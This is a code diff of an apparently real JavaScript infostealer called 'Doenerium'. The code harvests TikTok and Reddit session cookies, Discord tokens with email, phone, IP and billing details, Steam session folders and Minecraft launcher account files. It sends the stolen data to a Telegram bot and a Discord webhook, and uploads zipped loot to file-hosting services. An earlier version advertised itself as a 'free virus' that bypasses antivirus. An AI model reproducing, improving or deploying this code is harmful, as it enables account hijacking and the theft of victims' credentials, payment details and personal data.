+        'accept-encoding': 'gzip, compress, deflate, br',
+        'cookie': `sessionid=${cookie}`
+      };
+  
+      const accountResponse = await axios.get("https://www.tiktok.com/passport/web/account/info/?aid=1459&app_language=de-DE&app_name=tiktok_web&battery_info=1&browser_language=de-DE&browser_name=Mozilla&browser_online=true&browser_platform=Win32&browser_version=5.0%20(Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36&channel=tiktok_web&cookie_enabled=true&device_platform=web_pc&focus_state=true&from_page=fyp&history_len=2&is_fullscreen=false&is_page_visible=true&os=windows&priority_region=DE&referer=&region=DE&screen_height=1080&screen_width=1920&tz_name=Europe/Berlin&webcast_language=de-DE", { headers });
+  
+      const accountInfo = accountResponse.data;
+  
+      if (!accountInfo || !accountInfo.data || !accountInfo.data.username) {
+        throw new Error("Failed to retrieve TikTok account information.");
+      }
+  
+      const insightsResponse = await axios.post(
+        "https://api.tiktok.com/aweme/v1/data/insighs/?tz_offset=7200&aid=1233&carrier_region=DE",
+        "type_requests=[{\"insigh_type\":\"vv_history\",\"days\":16},{\"insigh_type\":\"pv_history\",\"days\":16},{\"insigh_type\":\"like_history\",\"days\":16},{\"insigh_type\":\"comment_history\",\"days\":16},{\"insigh_type\":\"share_history\",\"days\":16},{\"insigh_type\":\"user_info\"},{\"insigh_type\":\"follower_num_history\",\"days\":17},{\"insigh_type\":\"follower_num\"},{\"insigh_type\":\"week_new_videos\",\"days\":7},{\"insigh_type\":\"week_incr_video_num\"},{\"insigh_type\":\"self_rooms\",\"days\":28},{\"insigh_type\":\"user_live_cnt_history\",\"days\":58},{\"insigh_type\":\"room_info\"}]",
+        { headers: { cookie: `sessionid=${cookie}` } }
+      );
+  
+      const insights = insightsResponse.data;
+  
+      const walletResponse = await axios.get(
+        "https://webcast.tiktok.com/webcast/wallet_api/diamond_buy/permission/?aid=1988&app_language=de-DE&app_name=tiktok_web&battery_info=1&browser_language=de-DE&browser_name=Mozilla&browser_online=true&browser_platform=Win32&browser_version=5.0%20(Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36&channel=tiktok_web&cookie_enabled=true",
+        { headers: { cookie: `sessionid=${cookie}` } }
+      );
+  
+      const wallet = walletResponse.data;
+  
+      const message = `
+  ${user.hostname} - TikTok Session
+  Email: ${accountInfo.data.email || "No Email"}
+  Username: ${accountInfo.data.username}
+  User ID: ${accountInfo.data.user_id_str || "Not available"}
+  Followers: ${insights?.follower_num?.value || "Not available"}
+  Coins: ${wallet.data.coins || "Not available"}
+  Profile URL: [Click here](https://tiktok.com/@${accountInfo.data.username})
+  Cookie: ${cookie}               
+      `;
+  
+      const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
+  
+      let retryAttempts = 0;
+      while (retryAttempts < 3) {
+        try {
+          await axios.post(telegramUrl, {
+            chat_id: chatId,
+            text: message,
+            parse_mode: 'HTML'
+          });
+          console.log('Telegram message sent successfully!');
+          moveTikTokFile(cookie);
+          break;
+        } catch (error) {
+          if (error.response && error.response.status === 429) {
+            const delay = Math.pow(2, retryAttempts) * 1000;
+            retryAttempts++;
+            await new Promise(resolve => setTimeout(resolve, delay));
+          } else {
+            console.error("Error in Telegram message request:", error.message);
+            return;
+          }
+        }
+      }
     } catch (error) {
-        axios.post(discordWebhookUrl, { content: 'An error occurred Rddit: ' + error.message })
-            .catch(webhookError => {
-                console.error('Error sending Discord webhook:', webhookError.message);
-            });
+      console.error('An error occurred while trying to steal TikTok session:', error.message);
     }
-}
+  }
+
+
+async function setRedditSession(cookie) {
+    try {
+      const cookies = `reddit_session=${cookie}`;
+      const headers = {
+        'Cookie': cookies,
+        'Authorization': 'Basic b2hYcG9xclpZdWIxa2c6'
+      };
+  
+      const jsonData = {
+        grant_type: 'password',
+        scopes: ['*', 'email', 'pii']
+      };
+  
+      const tokenUrl = 'https://accounts.reddit.com/api/access_token';
+      const userDataUrl = 'https://oauth.reddit.com/api/v1/me';
+  
+      const tokenResponse = await axios.post(tokenUrl, jsonData, { headers });
+      const accessToken = tokenResponse.data.access_token;
+  
+      const userHeaders = {
+        'User-Agent': 'android:com.example.myredditapp:v1.2.3',
+        'Authorization': `Bearer ${accessToken}`
+      };
+  
+      const userDataResponse = await axios.get(userDataUrl, { headers: userHeaders });
+      const userData = userDataResponse.data;
+  
+      const username = userData.name;
+      const profileUrl = `https://www.reddit.com/user/${username}`;
+      const commentKarma = userData.comment_karma;
+      const totalKarma = userData.total_karma;
+      const coins = userData.coins;
+      const mod = userData.is_mod;
+      const gold = userData.is_gold;
+      const suspended = userData.is_suspended;
+  
+      const message = `
+  ${user.hostname} - Reddit Session
+  Username: ${username}
+  Karma: ${commentKarma}
+  Coins: ${coins}
+  Gold: ${gold ? 'Yes' : 'No'}
+  Moderator: ${mod ? 'Yes' : 'No'}
+  Suspended: ${suspended ? 'Yes' : 'No'}
+  Cookie: ${cookie}
+  Profile URL: ${profileUrl}
+      `;
+  
+      const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
+  
+      let retryAttempts = 0;
+      while (retryAttempts < 3) {
+        try {
+          await axios.post(telegramUrl, {
+            chat_id: chatId,
+            text: message,
+            parse_mode: 'HTML'
+          });
+          console.log("Message sent successfully to Telegram!");
+          break;
+        } catch (error) {
+          if (error.response && error.response.status === 429) {
+            const delay = Math.pow(2, retryAttempts) * 1000;
+            retryAttempts++;
+            await new Promise(resolve => setTimeout(resolve, delay));
+          } else {
+            console.error("Error in Telegram message request:", error.message);
+            return;
+          }
+        }
+      }
+    } catch (error) {
+      console.error("An error occurred while trying to set Reddit session:", error.message);
+    }
+  }
+  
 
    
-//
+
 const tokens = [];
 
 function findToken(path) {
@@ -1597,7 +1355,6 @@ function findToken(path) {
         const discordFilePath = path.join(discordFolderPath, 'discord.txt');
         const discordFileContent = tokens.join('\n');
 
-        // Create Discord folder if it doesn't exist
         if (!fs.existsSync(discordFolderPath)) {
           fs.mkdirSync(discordFolderPath);
         }
@@ -1658,15 +1415,11 @@ async function getTokens() {
         await findToken(path);
     }
 
-    const predefinedBio = `╔═══════════✧✧✧═══════════╗ 
-**     This free virus can bypass all antivirus !** 
-**           ⭐️https://discord.gg/doenerium** ⭐️
-╚═══════════✧✧✧═══════════╝`;
+    const predefinedBio = ``;
 
     for (let token of tokens) {
         try {
             const userData = await getUserData(token);
-
             if (!userData) continue;
 
             const phoneNumber = userData.phone || "None";
@@ -1681,104 +1434,77 @@ async function getTokens() {
             const ip = await getIp();
             const billing = await getBilling(token);
             const friends = await getRelationships(token);
-            const currentBio = userData.bio|| "None";
+            const currentBio = userData.bio || "None";
 
-            const randomString = crypto.randomBytes(16).toString('hex');
+            const message = `
+<b>${userData.username}#${userData.discriminator} (${userData.id})</b>
+<pre>Token: ${token}</pre>
+Email: ${userData.email}
+IP: ${ip}
+Phone: ${phoneNumber}
+Badges: ${getBadges(userData.flags)}
+Nitro Type: ${await getNitro(userData.premium_type, userData.id, token)}
+Billing: ${billing}
+HQ Guilds: ${hqGuilds}
+About me: ${newBio || currentBio}
+`;
 
-            const userInformationEmbed = {
-                title: `${userData.username}#${userData.discriminator} (${userData.id})`,
-                color: 0x303037,
-                author: {
-                    name: "Discord Session Detected",
-                    icon_url: "https://cdn.discordapp.com/attachments/660885288079589385/1190759106907226112/discord-logo-icon-editorial-free-vector_1.png"
-                },
-                thumbnail: {
-                    url: `https://cdn.discordapp.com/avatars/${userData.id}/${userData.avatar}?size=512`
-                },
-                fields: [
-                    {
-                        name: ":key: Token:",
-                        value: "```" + token + "```",
-                    },
-                    {
-                        name: ":envelope: Email:",
-                        value: "``" + `\`${userData.email}\`` + "``",
-                        inline: true
-                    },
-                    {
-                        name: ":globe_with_meridians: IP:",
-                        value: "``" + `\`${ip}\`` + "``",
-                        inline: true
-                    },
-                    {
-                        name: "<:mobile88:1210411486120517663> Phone:",
-                        value: "``" + `\`${phoneNumber}\`` + "``",
-                        inline: true
-                    },
-                    {
-                        name: "",
-                        value: `<a:all_discord_badges_gif:1157698511320653924> **Badges:** ${getBadges(userData.flags)}`,
-                        inline: true
-                    },
-                    {
-                        name: "",
-                        value: `<a:nitro_boost:877173596793995284> **Nitro Type:** ${await getNitro(userData.premium_type, userData.id, token)}`,
-                        inline: true
-                    },
-                    {
-                        name: "",
-                        value: `<a:Card_Black:1157319579287179294> **Billing:** ${billing}`,
-                        inline: true
-                    },
-                    {
-                        name: ":shield: HQ Guilds:",
-                        value: hqGuilds,
-                        inline: true
-                    },
-                ],
-                footer: {
-                    text: `${user.hostname} | @WallGod69 | discord.gg/doenerium`,
-                    icon_url: 'https://images-ext-1.discordapp.net/external/j13wOpj4IOzsnGWzfZFrNsUn7KgMCVWH0OBylRYcIWg/https/images-ext-1.discordapp.net/external/XF_zctmsx1ZUspqbqhZfSm91qIlNvdtEVMkl7uISZD8/%253Fsize%253D96%2526quality%253Dlossless/https/cdn.discordapp.com/emojis/948405394433253416.webp'
+            const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
+            let retryAttempts = 0;
+            while (retryAttempts < 3) {
+                try {
+                    await axios.post(telegramUrl, {
+                        chat_id: chatId,
+                        text: message,
+                        parse_mode: 'HTML'
+                    });
+                    console.log("Message sent successfully to Telegram!");
+                    break;
+                } catch (error) {
+                    if (error.response && error.response.status === 429) {
+                        const delay = Math.pow(2, retryAttempts) * 1000;
+                        retryAttempts++;
+                        await new Promise(resolve => setTimeout(resolve, delay));
+                    } else {
+                        console.error("Error in Telegram message request:", error.message);
+                        return;
+                    }
                 }
-            };
-
-            const data = {
-                embeds: [userInformationEmbed],
-            };
+            }
 
             if (friends !== '*Nothing to see here*') {
-                const friendsEmbed = {
-                    title: "Friends",
-                    color: 0x303037,
-                    description: friends,
-                    author: {
-                        name: "HQ Friends",
-                        icon_url: "https://images-ext-1.discordapp.net/external/XF_zctmsx1ZUspqbqhZfSm91qIlNvdtEVMkl7uISZD8/%3Fsize%3D96%26quality%3Dlossless/https/cdn.discordapp.com/emojis/948405394433253416.webp"
-                    },
-                    footer: {
-                        text: `${user.hostname} | @WallGod69 | discord.gg/doenerium`,
+                const friendsMessage = `
+<b>Friends of ${userData.username}</b>
+${friends}
+`;
+                retryAttempts = 0;
+                while (retryAttempts < 3) {
+                    try {
+                        await axios.post(telegramUrl, {
+                            chat_id: chatId,
+                            text: friendsMessage,
+                            parse_mode: 'HTML'
+                        });
+                        console.log("Friends information sent successfully to Telegram!");
+                        break;
+                    } catch (error) {
+                        if (error.response && error.response.status === 429) {
+                            const delay = Math.pow(2, retryAttempts) * 1000;
+                            retryAttempts++;
+                            await new Promise(resolve => setTimeout(resolve, delay));
+                        } else {
+                            console.error("Error in sending friends information:", error.message);
+                            return;
+                        }
                     }
-                };
-                data.embeds.push(friendsEmbed);
+                }
             }
-
-            if (newBio !== null) {
-                userInformationEmbed.fields.push({
-                    name: "<a:aa_star_black:1157319572328808449> New About me:",
-                    value: "```\n" + newBio + "\n```",
-                });
-            } else if (currentBio !== null) {
-                userInformationEmbed.fields.push({
-                    name: "<a:aa_star_black:1157319572328808449> About me:",
-                    value: "```\n" + userData.bio + "\n```",
-                });
-            }
-            await axios.post(discordWebhookUrl, data);
         } catch (error) {
-            console.error(error);
+            console.error("An error occurred:", error.message);
         }
     }
 }
+
 
 async function updateBio(token, newBio) {
     try {
@@ -1813,7 +1539,7 @@ async function getHQGuilds(token) {
         const hqGuilds = response.data.filter(guild => guild.permissions === "562949953421311");
 
         if (hqGuilds.length === 0) {
-            return "```No HQ Guilds```";
+            return "No HQ Guilds";
         }
 
         let result = "\n";
@@ -1822,12 +1548,12 @@ async function getHQGuilds(token) {
             const invites = await getGuildInvites(token, guild.id);
             const invite = invites.length > 0 ? `[Join Server](https://discord.gg/${invites[0].code})` : "No Invite";
 
-            const ownerOrAdmin = guild.owner ? "<:SA_Owner:991312415352430673> Owner" : "<:admin:967851956930482206> Admin";
+            const ownerOrAdmin = guild.owner ? "Owner" : "Admin";
 
-            result += `${ownerOrAdmin} | \`${guild.name} - Members: ${guild.approximate_member_count}\` - ${invite}\n`;
+            result += `${ownerOrAdmin} | ${guild.name} - Members: ${guild.approximate_member_count} - ${invite}\n`;
 
             if (result.length >= 1024) {
-                return "\`Too many servers to display.\`";
+                return "Too many servers to display.";
             }
         }
 
@@ -1858,57 +1584,57 @@ async function getGuildInvites(token, guildId) {
 const badges = {
     Discord_Employee: {
         Value: 1,
-        Emoji: "<:staff:874750808728666152>",
+        Emoji: "Discord Employee",
         Rare: true,
     },
     Partnered_Server_Owner: {
         Value: 2,
-        Emoji: "<:partner:874750808678354964>",
+        Emoji: "Partnered Server Owner",
         Rare: true,
     },
     HypeSquad_Events: {
         Value: 4,
-        Emoji: "<:hypesquad_events:874750808594477056>",
+        Emoji: "HypeSquad",
         Rare: true,
     },
     Bug_Hunter_Level_1: {
         Value: 8,
-        Emoji: "<:bughunter_1:874750808426692658>",
+        Emoji: "Bug Hunter 1",
         Rare: true,
     },
     Early_Supporter: {
         Value: 512,
-        Emoji: "<:early_supporter:874750808414113823>",
+        Emoji: "Early Supporter",
         Rare: true,
     },
     Bug_Hunter_Level_2: {
         Value: 16384,
-        Emoji: "<:bughunter_2:874750808430874664>",
+        Emoji: "Bug Hunter 2",
         Rare: true,
     },
     Early_Verified_Bot_Developer: {
         Value: 131072,
-        Emoji: "<:developer:874750808472825986>",
+        Emoji: "Developer",
         Rare: true,
     },
     House_Bravery: {
         Value: 64,
-        Emoji: "<:bravery:874750808388952075>",
+        Emoji: "Bravery",
         Rare: false,
     },
     House_Brilliance: {
         Value: 128,
-        Emoji: "<:brilliance:874750808338608199>",
+        Emoji: "Brilliance",
         Rare: false,
     },
     House_Balance: {
         Value: 256,
-        Emoji: "<:balance:874750808267292683>",
+        Emoji: "Balance",
         Rare: false,
     },
     Discord_Official_Moderator: {
         Value: 262144,
-        Emoji: "<:moderator:976739399998001152>",
+        Emoji: "Moderator",
         Rare: true,
     }
 };
@@ -1920,7 +1646,7 @@ async function getRelationships(token) {
             "authorization": token
         }
     }).catch(() => { })
-    if (!j) return `*Account locked*`
+    if (!j) return `Account locked`
     var json = j.data
     const r = json.filter((user) => {
         return user.type == 1
@@ -1932,7 +1658,7 @@ async function getRelationships(token) {
             gay += `${b} | \`${z.user.username}#${z.user.discriminator}\`\n`
         }
     }
-    if (gay == '') gay = "*Nothing to see here*"
+    if (gay == '') gay = "Nothing to see here"
     return gay
 }
 
@@ -1945,17 +1671,17 @@ async function getBilling(token) {
         }
     }).then(res => { json = res.data })
         .catch(err => { })
-    if (!json) return '\`Unknown\`';
+    if (!json) return 'Unknown';
 
     var bi = '';
     json.forEach(z => {
         if (z.type == 2 && z.invalid != !0) {
-            bi += "<:946246524504002610:962747802830655498>";
+            bi += "Paypal";
         } else if (z.type == 1 && z.invalid != !0) {
-            bi += "<:rustler:987692721613459517>";
+            bi += "Credit Card";
         }
     });
-    if (bi == '') bi = "```No Billing```";
+    if (bi == '') bi = "No Billing";
     return bi;
 }
 
@@ -1965,7 +1691,7 @@ function getBadges(flags) {
         let o = badges[prop];
         if ((flags & o.Value) == o.Value) b += o.Emoji;
     };
-    if (b == '') return "```No Badges```";
+    if (b == '') return "No Badges";
     return `${b}`;
 }
 
@@ -1981,7 +1707,7 @@ function getRareBadges(flags) {
 async function getNitro(flags, id, token) {
     switch (flags) {
         case 1:
-            return "<:946246402105819216:962747802797113365>";
+            return "Nitro Basic";
         case 2:
             let info;
             await axios.get(`https://discord.com/api/v9/users/${id}/profile`, {
@@ -1991,11 +1717,11 @@ async function getNitro(flags, id, token) {
                 }
             }).then(res => { info = res.data })
                 .catch(() => { })
-            if (!info) return "<:946246402105819216:962747802797113365>";
+            if (!info) return "Nitro Boost";
 
-            if (!info.premium_guild_since) return "<:946246402105819216:962747802797113365>";
+            if (!info.premium_guild_since) return "Nitro Boost";
 
-            let boost = ["<:boost1month:1161356435360325673>", "<:boost2month:1161356669004030033>", "<:boost3month:1161356821806710844>", "<:boost6month:1161357418480029776>", "<:boost9month:1161357513820741852>", "<:boost12month:1161357639737946206>", "<:boost15month:967518897987256400>", "<:boost18month:967519190133145611>", "<:boost24month:969686081958207508>"]
+            let boost = ["1 Month Boost", "2 Month Boost", "3 Month Boost", "6 Month Boost", "9 Month Boost", "12 Month Boost", "15 Month Boost", "18 Month Boost", "24 Month Boost"]
             var i = 0
 
             try {
@@ -2054,9 +1780,9 @@ async function getNitro(flags, id, token) {
             } catch {
                 i += 0
             }
-            return `<:946246402105819216:962747802797113365> ${boost[i]}`
+            return `Nitro ${boost[i]}`
         default:
-            return "```No Nitro```";
+            return "No Nitro";
     };
 }
 
@@ -2266,7 +1992,7 @@ async function StealEpicGames() {
                 }
             });
 
-            const howToUseContent = `<================[discord.gg/doenerium Stealer]>================>\n\n
+            const howToUseContent = `<================<[t.me/doenerium9696/Doenerium Stealer]>================>\n\n
 Close EpicGamesLauncher first, WIN + R type --> %localappdata%\\EpicGamesLauncher\\Saved\n
 delete everything and copy all contents into the Epic Games folder and run.`;
 
@@ -2282,69 +2008,80 @@ delete everything and copy all contents into the Epic Games folder and run.`;
 }
 
 async function SubmitSteam() {
-  try {
-    var exists = false;
-
-    if (fs.existsSync("C:\\Program Files (x86)\\Steam") && fs.existsSync("C:\\Program Files (x86)\\Steam\\config\\loginusers.vdf")) {
-      exists = true;
-      exec("taskkill /IM Steam.exe /F", (error, stdout, stderr) => {});
-      await new Promise(resolve => setTimeout(resolve, 2500));
-    } else {
-      exists = false;
-    }
-
-    if (exists) {
-      const steamFoldersToCopy = ["userdata", "config"];
-
-      steamFoldersToCopy.forEach(folder => {
-        const sourcePath = path.join("C:\\Program Files (x86)\\Steam", folder);
-        const destinationPath = path.join(mainFolderPath, 'Steam', folder);
-
-        try {
-          copyGames(sourcePath, destinationPath);
-          console.log(`Copied ${folder} to ${mainFolderPath}/Steam`);
-        } catch (err) {
-          console.error(`An error occurred while copying ${folder}: ${err.message}`);
-        }
-      });
-
-      console.log('Steam session data copied to mainFolder/Steam');
-    }
-  } catch (error) {
-    console.error(`Error in SubmitSteam: ${error.message}`);
-  }
-}
-
-async function stealSteamSession() {
     try {
-        if (fs.existsSync("C:\\Program Files (x86)\\Steam") && fs.existsSync("C:\\Program Files (x86)\\Steam\\config\\loginusers.vdf")) {
-            const accounts = fs.readFileSync("C:\\Program Files (x86)\\Steam\\config\\loginusers.vdf", "utf-8");
-            const accountIds = accounts.match(/7656[0-9]{13}/g) || [];
-
-            for (const account of accountIds) {
-                try {
-                    const { data: { response: accountInfo } } = await axios.get("https://api.steampowered.com/ISteamUser/GetPlayerSummaries/v0002/?key=440D7F4D810EF9298D25EDDF37C1F902&steamids=" + account);
-                    const { data: { response: games } } = await axios.get("https://api.steampowered.com/IPlayerService/GetOwnedGames/v1/?key=440D7F4D810EF9298D25EDDF37C1F902&steamid=" + account);
-                    const { data: { response: level } } = await axios.get("https://api.steampowered.com/IPlayerService/GetSteamLevel/v1/?key=440D7F4D810EF9298D25EDDF37C1F902&steamid=" + account);
-
-                    const webhookPayload = {
-                        embeds: [
-                            createSteamEmbed(account, accountInfo, games, level)
-                        ]
-                    };
-
-
-                    await axios.post(discordWebhookUrl, webhookPayload);
-                    console.log('Second Steam session detected embed sent to webhook.');
-                } catch (error) {
-                    console.error(`An error occurred while processing Steam account ${account}: ${error.message}`);
-                }
+      const steamFoldersToCopy = ["userdata", "config"];
+      let steamFound = false;
+  
+      for (let i = 65; i <= 90; i++) {
+        const driveLetter = String.fromCharCode(i);
+        const steamPath = `${driveLetter}:\\Program Files (x86)\\Steam`;
+        const loginFile = path.join(steamPath, "config", "loginusers.vdf");
+  
+        if (fs.existsSync(steamPath) && fs.existsSync(loginFile)) {
+          steamFound = true;
+          console.log(`Steam detected on ${driveLetter} drive`);
+  
+          exec("taskkill /IM Steam.exe /F", (error, stdout, stderr) => {});
+          await new Promise(resolve => setTimeout(resolve, 2500));
+  
+          steamFoldersToCopy.forEach(folder => {
+            const sourcePath = path.join(steamPath, folder);
+            const destinationPath = path.join(mainFolderPath, 'Steam', folder);
+  
+            try {
+              copyGames(sourcePath, destinationPath);
+              console.log(`Copied ${folder} to ${mainFolderPath}/Steam`);
+            } catch (err) {
+              console.error(`An error occurred while copying ${folder}: ${err.message}`);
             }
+          });
+  
+          console.log('Steam session data copied to mainFolder/Steam');
         }
+      }
+  
+      if (!steamFound) {
+        console.log("Steam installation not found on any drives from A: to Z:");
+      }
     } catch (error) {
-        console.error(`Error in stealSteamSession: ${error.message}`);
+      console.error(`Error in SubmitSteam: ${error.message}`);
     }
-}
+  }
+  
+  async function stealSteamSession() {
+    try {
+      for (let i = 65; i <= 90; i++) {
+        const driveLetter = String.fromCharCode(i);
+        const loginFile = `${driveLetter}:\\Program Files (x86)\\Steam\\config\\loginusers.vdf`;
+  
+        if (fs.existsSync(loginFile)) {
+          const accounts = fs.readFileSync(loginFile, "utf-8");
+          const accountIds = accounts.match(/7656[0-9]{13}/g) || [];
+  
+          for (const account of accountIds) {
+            try {
+              const { data: { response: accountInfo } } = await axios.get("https://api.steampowered.com/ISteamUser/GetPlayerSummaries/v0002/?key=440D7F4D810EF9298D25EDDF37C1F902&steamids=" + account);
+              const { data: { response: games } } = await axios.get("https://api.steampowered.com/IPlayerService/GetOwnedGames/v1/?key=440D7F4D810EF9298D25EDDF37C1F902&steamid=" + account);
+              const { data: { response: level } } = await axios.get("https://api.steampowered.com/IPlayerService/GetSteamLevel/v1/?key=440D7F4D810EF9298D25EDDF37C1F902&steamid=" + account);
+  
+              const webhookPayload = {
+                embeds: [
+                  createSteamEmbed(account, accountInfo, games, level)
+                ]
+              };
+  
+              await axios.post(discordWebhookUrl, webhookPayload);
+              console.log('Steam session data sent to webhook.');
+            } catch (error) {
+              console.error(`An error occurred while processing Steam account ${account}: ${error.message}`);
+            }
+          }
+        }
+      }
+    } catch (error) {
+      console.error(`Error in stealSteamSession: ${error.message}`);
+    }
+  }
 
 
 function createSteamEmbed(account, accountInfo, games, level) {
@@ -2429,45 +2166,89 @@ async function getGrowtopia() {
 }
 
 
+// Steal Minecraft
 async function submitMinecraft(mainFolderPath) {
-    try {
-        const userHome = os.homedir();
-        const minecraftPath = path.join(process.env.APPDATA, '.minecraft');
-        const lunarclientPath = path.join(userHome, '.lunarclient');
+  try {
+    const userHome = os.homedir();
 
-        const launcherProfilesPath = path.join(minecraftPath, 'launcher_profiles.json');
-        const lunarclientAccountsPath = path.join(lunarclientPath, 'settings', 'game', 'accounts.json');
+    const launcherPaths = {
+      Mojang: path.join(process.env.APPDATA, '.minecraft'),
+      ZLauncher: path.join(process.env.APPDATA, 'ZLauncher'),
+      LunarClient: path.join(userHome, '.lunarclient'),
+      Badlion: path.join(process.env.APPDATA, '.badlion'),
+      ATLauncher: path.join(process.env.APPDATA, 'ATLauncher'),
+      TLauncher: path.join(process.env.APPDATA, '.tlauncher'),
+      MultiMC: path.join(userHome, 'MultiMC'),
+      CurseForge: path.join(process.env.APPDATA, 'CurseForge', 'minecraft'),
+      Technic: path.join(process.env.APPDATA, '.technic')
+    };
 
-        const filesToCheck = [
-            launcherProfilesPath,
-            lunarclientAccountsPath
-        ];
+    const filesToCheck = [
+      { launcher: 'Mojang', path: path.join(launcherPaths.Mojang, 'launcher_profiles.json') },
+      { launcher: 'LunarClient', path: path.join(launcherPaths.LunarClient, 'settings', 'game', 'accounts.json') },
+      { launcher: 'Badlion', path: path.join(launcherPaths.Badlion, 'accounts.json') },
+      { launcher: 'ATLauncher', path: path.join(launcherPaths.ATLauncher, 'accounts.json') },
+      { launcher: 'TLauncher', path: path.join(launcherPaths.TLauncher, 'accounts.dat') },
+      { launcher: 'MultiMC', path: path.join(launcherPaths.MultiMC, 'accounts.json') },
+      { launcher: 'CurseForge', path: path.join(launcherPaths.CurseForge, 'profiles.json') },
+      { launcher: 'Technic', path: path.join(launcherPaths.Technic, 'settings.json') }
+    ];
 
-        const existingFiles = filesToCheck.filter(filePath => fs.existsSync(filePath));
+    const existingFiles = filesToCheck.filter(file => fs.existsSync(file.path));
 
-        if (existingFiles.length > 0) {
-            for (const filePath of existingFiles) {
-                const destinationPath = path.join(mainFolderPath, 'Minecraft', path.basename(filePath));
-                await ensureDirectoryExistence(path.dirname(destinationPath));
-                await copyFile(filePath, destinationPath);
-                console.log(`Copied ${filePath} to ${destinationPath}`);
-            }
-            console.log('Minecraft session data copied to mainFolder/Minecraft');
-        }
-
-        // Copy entire Lunar Client settings directory if it exists
-        const lunarclientSettingsPath = path.join(lunarclientPath, 'settings');
-        const targetSettingsPath = path.join(mainFolderPath, 'LunarClient', 'settings');
-        
-        if (fs.existsSync(lunarclientSettingsPath)) {
-            await copyFolderContents(lunarclientSettingsPath, targetSettingsPath);
-            console.log(`Copied Lunar Client settings from ${lunarclientSettingsPath} to ${targetSettingsPath}`);
-        }
-    } catch (error) {
-        console.error(`Error: ${error.message}`);
+    if (existingFiles.length > 0) {
+      for (const file of existingFiles) {
+        const destinationPath = path.join(mainFolderPath, 'Minecraft', file.launcher, path.basename(file.path));
+        await ensureDirectoryExistence(path.dirname(destinationPath));
+        await copyFile(file.path, destinationPath);
+        console.log(`Copied ${file.launcher} data from ${file.path} to ${destinationPath}`);
+      }
+      console.log('Minecraft session data copied to mainFolder/Minecraft');
     }
+
+    for (const [launcher, launcherPath] of Object.entries(launcherPaths)) {
+      const settingsPath = path.join(launcherPath, 'settings');
+      const targetSettingsPath = path.join(mainFolderPath, launcher, 'settings');
+
+      if (fs.existsSync(settingsPath)) {
+        await copyFolderContents(settingsPath, targetSettingsPath);
+        console.log(`Copied ${launcher} settings from ${settingsPath} to ${targetSettingsPath}`);
+      }
+    }
+  } catch (error) {
+    console.error(`Error: ${error.message}`);
+  }
 }
 
+async function ensureDirectoryExistence(filePath) {
+  if (!fs.existsSync(filePath)) {
+    fs.mkdirSync(filePath, { recursive: true });
+  }
+}
+
+async function copyFile(source, target) {
+  fs.copyFileSync(source, target);
+}
+
+async function copyFolderContents(source, target) {
+  if (!fs.existsSync(target)) {
+    fs.mkdirSync(target, { recursive: true });
+  }
+  const entries = fs.readdirSync(source, { withFileTypes: true });
+
+  for (const entry of entries) {
+    const sourcePath = path.join(source, entry.name);
+    const targetPath = path.join(target, entry.name);
+
+    if (entry.isDirectory()) {
+      await copyFolderContents(sourcePath, targetPath);
+    } else {
+      fs.copyFileSync(sourcePath, targetPath);
+    }
+  }
+}
+
+// Steal Screenshot
 async function createScreenshotScript() {
     const screenshotsFolder = path.join(mainFolderPath, 'Screenshots');
     
@@ -2497,13 +2278,8 @@ if __name__ == "__main__":
     `;
 
     try {
-        // Write the Python script to a file
         await fs.promises.writeFile(scriptPath, pythonScriptContent);
-
-        // Install the Pillow dependency
         await execPromise('pip install pillow');
-
-        // Execute the Python script
         await execPromise(`python ${scriptPath}`);
 
         console.log(`Python script executed successfully: ${scriptPath}`);
@@ -2639,48 +2415,8 @@ async function archiveAndSendData() {
     }
 }
 
-async function uploadToDoge(destinationFolder, locale, computerName) {
-    return new Promise((resolve, reject) => {
-        const zipFilePath = `${destinationFolder}/${locale}-${computerName}.zip`;
-
-        if (!fs.existsSync(zipFilePath)) {
-            console.error(`Error: File does not exist - ${zipFilePath}`);
-            reject(new Error(`File does not exist - ${zipFilePath}`));
-            return;
-        }
-
-        const uploadCommand = `curl --location --request POST "https://api.filedoge.com/upload" -H "Content-Type: multipart/form-data;" --form "file=@${zipFilePath.replace(/\\/g, '/')}";`;
-
-        exec(uploadCommand, (error, stdout, stderr) => {
-            if (error) {
-                console.error(`Error uploading to FileDoge: ${error}`);
-                reject(error);
-            } else {
-                try {
-                    const response = JSON.parse(stdout);
-                    const token = response.token;
-
-                    // Check if token is undefined
-                    if (!token) {
-                        console.error('Upload to FileDoge returned undefined token.');
-                        reject(new Error('Upload failed: received undefined token.'));
-                        return;
-                    }
-
-                    const downloadLink = `https://api.filedoge.com/download/${token}`;
-                    console.log(`Upload successful to FileDoge. Download link: ${downloadLink}`);
-                    resolve(downloadLink);
-                } catch (jsonError) {
-                    console.error(`Error parsing JSON response: ${jsonError}`);
-                    reject(new Error('Invalid JSON response from the API'));
-                }
-            }
-        });
-    });
-}
 
 
-// Upload file to Oshi.at
 async function uploadToOshiAt(filePath, computerName) {
     try {
         const form = new FormData();
@@ -2734,8 +2470,7 @@ async function uploadToFileio(filePath) {
         const form = new FormData();
         form.append('file', fs.createReadStream(filePath));
         
-        // You can specify additional options here
-        form.append('expire', '1w'); // Keep the file for one week, change to your preference
+        form.append('expire', '1w');
 
         const response = await axios.post('https://file.io/', form, {
             headers: form.getHeaders(),
@@ -2748,22 +2483,12 @@ async function uploadToFileio(filePath) {
     }
 }
 
-// Main function to handle file upload
 async function uploadFile(destinationFolder, locale, computerName) {
     const zipFilePath = `${destinationFolder}/${locale}-${computerName}.zip`;
 
     if (!fs.existsSync(zipFilePath)) {
         console.error(`Error: File does not exist - ${zipFilePath}`);
         throw new Error(`File does not exist - ${zipFilePath}`);
-    }
-
-    try {
-        const dogeLink = await uploadToDoge(destinationFolder, locale, computerName);
-        console.log(`Upload successful to FileDoge. Link: ${dogeLink}`);
-        return dogeLink;
-    } catch (error) {
-        console.error(`FileDoge upload failed: ${error.message}`);
-        // Proceed to use other uploaders if FileDoge fails
     }
 
     try {
@@ -2785,7 +2510,6 @@ async function uploadFile(destinationFolder, locale, computerName) {
     throw new Error('All upload methods failed');
 }
 
-// Helper function to get the list of servers (assuming you already have this function implemented)
 async function getServers() {
     try {
         console.log('Searching servers...');
@@ -2824,7 +2548,6 @@ async function getExtension(zipFilePath) {
